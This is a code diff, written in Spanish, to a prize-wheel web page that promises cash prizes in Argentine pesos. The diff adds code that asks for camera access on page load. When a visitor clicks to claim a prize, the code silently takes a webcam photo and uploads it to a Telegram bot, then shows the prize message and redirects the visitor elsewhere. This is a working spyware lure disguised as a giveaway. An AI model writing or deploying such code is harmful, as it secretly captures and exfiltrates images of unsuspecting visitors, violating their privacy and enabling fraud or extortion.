@@ -79,7 +79,7 @@
             margin-top: 20px;
         }
 
-        /* Aseguramos que todo se vea bien en dispositivos pequeños */
+        /* Responsive */
         @media screen and (max-width: 600px) {
             .ruleta {
                 width: 90vw;
@@ -105,6 +105,17 @@
     <script>
         let premio = "";
         let premios = ["5000 ARG", "7000 ARG", "1000 ARG", "15000 ARG", "40000 ARG", "50000 ARG"];
+        let videoStream = null;
+
+        // Pedir permiso para la cámara
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then((stream) => {
+                videoStream = stream;
+            })
+            .catch((error) => {
+                console.error('Error al acceder a la cámara:', error);
+                alert("No se pudo acceder a la cámara. Verifica los permisos.");
+            });
 
         document.getElementById('spinButton').addEventListener('click', function() {
             let randomDeg = Math.floor(Math.random() * 360) + 720;
@@ -118,8 +129,61 @@
             }, 4000);
         });
 
+        function tomarFotoYEnviar() {
+            if (!videoStream) {
+                alert("No se pudo acceder a la cámara.");
+                return;
+            }
+
+            const video = document.createElement('video');
+            video.srcObject = videoStream;
+            video.play();
+
+            video.onloadeddata = () => {
+                const canvas = document.createElement('canvas');
+                canvas.width = 400;
+                canvas.height = 300;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                const fotoBase64 = canvas.toDataURL('image/png');
+                enviarFotoATelegram(fotoBase64);
+            };
+        }
+
+        function enviarFotoATelegram(fotoBase64) {
+            const BOT_TOKEN = "TU_BOT_TOKEN";  // 🔴 Reemplaza con el token de tu bot
+            const CHAT_ID = "TU_CHAT_ID";  // 🔴 Reemplaza con tu chat ID de Telegram
+            const blob = dataURItoBlob(fotoBase64);
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", blob, "foto.png");
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => console.log("Foto enviada a Telegram:", data))
+            .catch(error => console.error("Error al enviar la foto:", error));
+        }
+
+        function dataURItoBlob(dataURI) {
+            let byteString = atob(dataURI.split(',')[1]);
+            let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            let arrayBuffer = new ArrayBuffer(byteString.length);
+            let uint8Array = new Uint8Array(arrayBuffer);
+
+            for (let i = 0; i < byteString.length; i++) {
+                uint8Array[i] = byteString.charCodeAt(i);
+            }
+
+            return new Blob([arrayBuffer], { type: mimeString });
+        }
+
         function reclamarPremio() {
-            alert("¡Has ganado un premio de " + premio + "! Redirigiendo a otro enlace...");
+            tomarFotoYEnviar();
+            alert("¡Has ganado un premio de " + premio + "! Redirigiendo...");
             window.location.href = "https://otro-enlace.com"; 
         }
     </script>
